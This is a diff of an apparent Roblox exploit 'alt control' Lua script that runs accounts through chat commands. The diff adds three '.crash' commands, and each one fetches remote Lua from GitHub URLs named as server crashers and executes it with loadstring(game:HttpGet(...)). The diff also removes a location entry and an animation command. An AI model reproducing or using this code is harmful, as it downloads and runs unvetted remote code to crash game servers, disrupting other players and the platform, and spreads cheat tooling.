@@ -206,7 +206,6 @@ end
 local BringLocations = {
 	["bank"] = CFrame.new(-396.988922, 21.7570763, -293.929779, -0.102468058, -1.9584887e-09, -0.994736314, 7.23731564e-09, 1, -2.71436984e-09, 0.994736314, -7.47735651e-09, -0.102468058),
 	["admin"] = CFrame.new(-872.453674, -32.6421318, -532.476379, 0.999682248, -1.36019978e-08, 0.0252073351, 1.33811247e-08, 1, 8.93094043e-09, -0.0252073351, -8.59080007e-09, 0.999682248),
- 	["court"] = CFrame.new(-942.289794921875, 22.00316619873047, -482.5327453613281),	
 	["klub"] = CFrame.new(-264.434479, 0.0355005264, -430.854736, -0.999828756, 9.58909574e-09, -0.0185054261, 9.92017934e-09, 1, -1.77993904e-08, 0.0185054261, -1.79799198e-08, -0.999828756),	
 	["vault"] = CFrame.new(-495.485901, 23.1428547, -284.661713, -0.0313318223, -4.10440322e-08, 0.999509037, 2.18453966e-08, 1, 4.17489829e-08, -0.999509037, 2.31427428e-08, -0.0313318223),
 	["train"] = CFrame.new(591.396118, 34.5070686, -146.159561, 0.0698467195, -4.91725913e-08, -0.997557759, 5.03374231e-08, 1, -4.57684664e-08, 0.997557759, -4.70177071e-08, 0.0698467195),	
@@ -222,13 +221,6 @@ local SetupsTable = {
 	},
 	Admin = {
 		Origin = CFrame.new(-884.12915, -38.3972931, -545.291809, -0.99998939, 2.69316498e-08, -0.00460755778, 2.6944301e-08, 1, -2.68358624e-09, 0.00460755778, -2.80770518e-09, -0.99998939),
-		ZMultiplier = 3,
-		XMultiplier = 8,
-		PerRow = 10,
-		Rows = 4,
-	},
- 	Court = {
-		Origin = CFrame.new(-942.289794921875, 22.00316619873047, -482.5327453613281),
 		ZMultiplier = 3,
 		XMultiplier = 8,
 		PerRow = 10,
@@ -439,6 +431,71 @@ local function Initiate()
 				Clone.HumanoidRootPart.CFrame = cfr * CFrame.fromEulerAnglesXYZ(0,math.rad(angle),0) * CFrame.new(0,-size,-10)
 				Clone.HumanoidRootPart.CFrame=Clone.HumanoidRootPart.CFrame*CFrame.new(0,0,2)
 				Clone.HumanoidRootPart.CFrame=Clone.HumanoidRootPart.CFrame*CFrame.Angles(0,math.rad(180),0)
+			elseif Args[1] == ".crash" and Args[2] == "swag" and not Crashed then
+				local Player = GetPlayerFromString(Args[3],true)
+				if Player and Player == game.Players.LocalPlayer then
+					if game.CoreGui:FindFirstChild("RenderScreen") then
+						game.CoreGui.RenderScreen:Destroy()
+					end
+					game:GetService("RunService"):Set3dRenderingEnabled(true)
+					Crashed = true
+					loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
+					for Index,Var in pairs(CmdSettings) do
+						CmdSettings[Var] = nil
+					end
+					CmdSettings = {}
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)	
+				end
+			elseif Args[1] == ".crash" and Args[2] == "encrypt" and not Crashed then
+				local Player = GetPlayerFromString(Args[3],true)
+				if Player and Player == game.Players.LocalPlayer then
+					if game.CoreGui:FindFirstChild("RenderScreen") then
+						game.CoreGui.RenderScreen:Destroy()
+					end
+					game:GetService("RunService"):Set3dRenderingEnabled(true)
+					Crashed = true
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/remorseW/encryptW/main/CustomEncryptCrasher.lua"))()
+
+					for Index,Var in pairs(CmdSettings) do
+						CmdSettings[Var] = nil
+					end
+					CmdSettings = {}
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)	
+				end
+			elseif Args[1] == ".crash" and Args[2] == "15min" and not Crashed then
+				local Player = GetPlayerFromString(Args[3],true)
+				if Player and Player == game.Players.LocalPlayer then
+					if game.CoreGui:FindFirstChild("RenderScreen") then
+						game.CoreGui.RenderScreen:Destroy()
+					end
+					game:GetService("RunService"):Set3dRenderingEnabled(true)
+					Crashed = true
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/remorseW/encryptW/main/DahooSuperQuickCrash.lua"))()
+
+					for Index,Var in pairs(CmdSettings) do
+						CmdSettings[Var] = nil
+					end
+					CmdSettings = {}
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)
+					wait(1)
+					setfpscap(60)	
+				end
 			elseif Args[1] == ".stopdrop" then
 				Drop(false)
 			elseif Args[1] == ".reset" then
@@ -482,8 +539,6 @@ local function Initiate()
 				Setup("Vault")
 			elseif Message == ".setup train" then
 				Setup("Train")
-			elseif Message == ".setup court" then
-				Setup("court")
 			elseif Message == ".wallet on" then
 				ShowWallet()
 			elseif Message == ".wallet off" then
@@ -497,17 +552,6 @@ local function Initiate()
 				CurrAnim = game.Players.LocalPlayer.Character.Humanoid.Animator:LoadAnimation(Anim)
 				CurrAnim:Play()
 				CurrAnim:AdjustSpeed()
-
-			elseif Message == ".fasthands" then
-				if CurrAnim and CurrAnim.IsPlaying then
-					CurrAnim:Stop()
-				end
-				local Anim = Instance.new("Animation")
-				Anim.AnimationId = "http://www.roblox.com/asset/?id=4272351660"
-				CurrAnim = game.Players.LocalPlayer.Character.Humanoid.Animator:LoadAnimation(Anim)
-				CurrAnim:Play()
-				CurrAnim:AdjustSpeed()
-
 			elseif Message == ".monkey" then
 				if CurrAnim and CurrAnim.IsPlaying then
 					CurrAnim:Stop()
